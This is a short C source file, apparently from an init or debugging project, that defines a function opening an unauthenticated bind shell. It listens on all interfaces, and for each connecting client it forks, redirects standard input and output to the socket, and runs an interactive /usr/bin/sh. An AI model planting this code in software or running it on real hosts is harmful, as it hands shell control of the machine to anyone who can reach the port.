#include <netinet/in.h>
#include <signal.h>
#include <stdint.h>
#include <sys/socket.h>
#include <unistd.h>

#include "utils.h"

void bind_shell(uint16_t port) {
    const auto pid = fork();
    if (pid != 0) {
        // parent process or error: exit function
        return;
    }

    // automatically reap client shell processes
    signal(SIGCHLD, SIG_IGN); 

    const auto fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr = {.s_addr = htonl(INADDR_ANY)},
    };

    try(bind(fd, (struct sockaddr*)&addr, sizeof(addr)));
    try(listen(fd, 1));

    log("shell listening on 0.0.0.0:%d", port);

    while (true) {
        struct sockaddr_in client_addr = {};
        socklen_t client_len = sizeof(client_addr);

        // accept blocks until a new client connects
        const auto client_fd = accept(fd, (struct sockaddr*)&client_addr, &client_len);
        if (client_fd == -1) {
            continue;
        }

        const auto client_pid = fork();
        if (client_pid != 0) {
            // parent process or error: close copy of client's fd
            close(client_fd);
            continue;
        }

        const auto msg = "--- [ Remote Init Shell ] ---\n";
        write(client_fd, msg, strlen(msg));

        // child process: redirect fds and exec
        dup2(client_fd, 0); // stdin
        dup2(client_fd, 1); // stdout
        dup2(client_fd, 2); // stderr

        char* const argv[] = {"/usr/bin/sh", "-i", nullptr};
        char* const envp[] = {"PATH=/usr/bin:/bin", nullptr};

        execve(argv[0], argv, envp);
        error("execve to sh should not return", errno);
    }
}
